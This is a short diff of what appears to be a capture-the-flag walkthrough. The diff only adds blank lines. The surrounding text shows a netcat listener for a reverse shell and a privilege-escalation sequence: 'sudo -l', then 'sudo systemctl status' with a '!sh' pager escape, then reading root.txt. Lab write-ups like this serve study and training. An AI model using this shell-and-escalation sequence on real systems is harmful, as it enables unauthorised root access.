@@ -37,13 +37,21 @@ $ nc -lnvp 9999
  ## Back to Terminal A: Reverse Shell Opened
 
 ls
+
 cat root.txt
+
 cd
+
 sudo -l
+
 sudo systemctl status trail.service
+
 !sh -> to terminate
+
 cd
+
 ls
+
 cat root.txt
 
 
